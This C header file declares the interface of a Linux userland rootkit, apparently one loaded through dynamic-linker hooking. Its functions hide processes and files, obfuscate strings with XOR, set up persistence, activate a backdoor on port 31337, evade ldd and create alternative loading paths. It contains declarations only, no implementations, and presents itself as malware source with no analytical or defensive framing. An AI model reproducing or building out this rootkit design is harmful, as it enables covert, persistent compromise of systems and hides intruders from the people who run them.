#ifndef HIDE_H
#define HIDE_H

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>

#define MAX_PATH_LEN 256
#define XOR_KEY 0x42
#define BACKDOOR_PORT 31337
#define MAX_HIDDEN_ITEMS 1000
#define RANDOM_PATH_LEN 64

typedef struct {
    char process_name[MAX_PATH_LEN];
    char file_name[MAX_PATH_LEN];
    int pid;
    time_t hide_time;
} hidden_item_t;

typedef struct {
    char original_path[MAX_PATH_LEN];
    char hidden_path[MAX_PATH_LEN];
    int is_active;
    time_t last_check;
} persistence_entry_t;

extern hidden_item_t hidden_processes[];
extern hidden_item_t hidden_files[];
extern persistence_entry_t persistence_entries[];
extern int hidden_process_count;
extern int hidden_file_count;
extern int persistence_count;
extern char rootkit_path[MAX_PATH_LEN];
extern char random_hide_path[MAX_PATH_LEN];
extern int backdoor_active;
extern int auto_uninstall_mode;

void xor_string(char* str, int len, char key);
void deobfuscate_string(char* str, int len);
int is_hidden_process(const char* name, int pid);
int is_hidden_file(const char* name);
void add_hidden_process(const char* name, int pid);
void add_hidden_file(const char* name);
void remove_hidden_process(const char* name);
void remove_hidden_file(const char* name);
void generate_random_path(char* path);
void setup_persistence(void);
void check_auto_uninstall(void);
void activate_backdoor(void);
void hide_from_ldd(void);
void create_alternative_loading(void);

#endif
